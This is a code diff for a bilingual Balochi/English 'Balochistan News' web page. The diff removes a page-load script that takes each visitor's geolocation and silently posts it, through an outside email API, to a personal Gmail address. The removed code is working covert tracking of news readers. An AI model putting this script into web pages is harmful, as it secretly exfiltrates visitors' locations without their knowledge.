@@ -92,7 +92,7 @@
 <header>
     حالیاتن بلوچستاں خبران - Balochistan News
 </header>
-    <nav>
+<nav>
     <ul>
         <li><a href="#home">گھر - Home</a></li>
         <li><a href="#latest">نوبتءِ خبر - Latest News</a></li>
@@ -128,76 +128,6 @@
 <footer>
     <p>&copy; 2024 Balochistan News | بلوچستاں حالیاتن خبران</p>
 </footer>
-
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-        const locationDisplay = document.getElementById("locationDisplay");
-        const newsSection = document.getElementById("news");
-
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    locationDisplay.textContent = `آپءِ موقعت: Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                    loadLocalNews(latitude, longitude);
-                    sendEmail('Location received', locationDisplay.textContent, 'khalilrodeni@gmail.com');
-                },
-                (error) => {
-                    switch (error.code) {
-                        case error.PERMISSION_DENIED:
-                            locationDisplay.textContent = "موقعتءِ رسائی رد ات گواں براوزر.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            locationDisplay.textContent = "موقعتءِ معلومات دستیاب نہنت.";
-                            break;
-                        case error.TIMEOUT:
-                            locationDisplay.textContent = "موقعتءِ درخواست دِ مہلت تمام ایں.";
-                            break;
-                        default:
-                            locationDisplay.textContent = "نامعلوم مسلہءِ پیش ایں.";
-                            break;
-                    }
-                    sendEmail('Location Access Error', locationDisplay.textContent, 'khalilrodeni@gmail.com');
-                }
-            );
-        } else {
-            locationDisplay.textContent = "موقعتءِ جیو لوکیشن براوزرءِ دستیاب نہنت.";
-        }
-
-        function loadLocalNews(latitude, longitude) {
-            // Placeholder for dynamically loading news articles based on location
-            newsSection.innerHTML += `
-                <div class="news-article">
-                    <img src="https://via.placeholder.com/800x400" alt="Local News Image">
-                    <h2>بلوچستانءِ علاقہءِ نوکیں خبر</h2>
-                    <p>موقعت ${latitude}, ${longitude} پہ بلوچستانءِ متعلقہ علاقہءِ نوکیں خبران انت۔</p>
-                </div>
-            `;
-        }
-
-        function sendEmail(subject, message, recipientEmail) {
-            const emailData = {
-                subject: subject,
-                message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "Balochistan News User"
-            };
-
-            fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(emailData)
-            })
-            .then(response => response.ok ? response.json() : Promise.reject(`Server responded with ${response.status}`))
-            .then(data => console.log(data.message ? "Email sent successfully!" : "Error sending email"))
-            .catch(error => console.log("Error sending email:", error));
-        }
-    });
-</script>
 
 </body>
 </html>
